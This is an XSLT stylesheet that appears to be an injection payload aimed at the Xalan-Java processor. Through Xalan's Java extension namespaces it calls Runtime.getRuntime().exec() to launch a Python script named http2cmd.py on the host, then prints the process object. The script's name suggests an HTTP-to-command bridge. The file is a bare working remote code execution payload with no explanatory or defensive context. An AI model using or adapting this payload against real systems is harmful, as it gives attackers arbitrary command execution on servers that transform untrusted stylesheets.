<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:date="http://xml.apache.org/xalan/java/java.util.Date" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:str="http://xml.apache.org/xalan/java/java.lang.String" exclude-result-prefixes="date">
     <xsl:output method="text"/>
     <xsl:template match="/">
     <xsl:variable name="cmd"><![CDATA[/usr/bin/python /home/users/tmp/http2cmd.py]]></xsl:variable>
     <xsl:variable name="rtObj" select="rt:getRuntime()"/>
     <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
     <xsl:text>Processus: </xsl:text><xsl:value-of select="$process"/>
    </xsl:template>
</xsl:stylesheet>
